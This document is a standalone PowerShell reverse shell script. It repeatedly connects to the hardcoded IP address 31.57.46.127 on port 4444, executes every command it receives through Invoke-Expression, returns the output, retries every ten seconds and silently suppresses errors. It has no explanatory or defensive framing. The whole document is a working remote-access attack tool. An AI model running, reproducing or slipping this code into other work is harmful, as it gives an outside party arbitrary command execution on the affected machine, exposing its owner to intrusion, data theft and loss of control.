while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect("31.57.46.127", 4444)

        if ($client.Connected) {
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535 | % {0}
            while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
                $sendback = (iex $data 2>&1 | Out-String )
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                $stream.Write($sendbyte,0,$sendbyte.Length)
                $stream.Flush()
            }
            $client.Close()
            break
        }
    } catch {
        # Do nothing or log error
    }

    Start-Sleep -Seconds 10
}
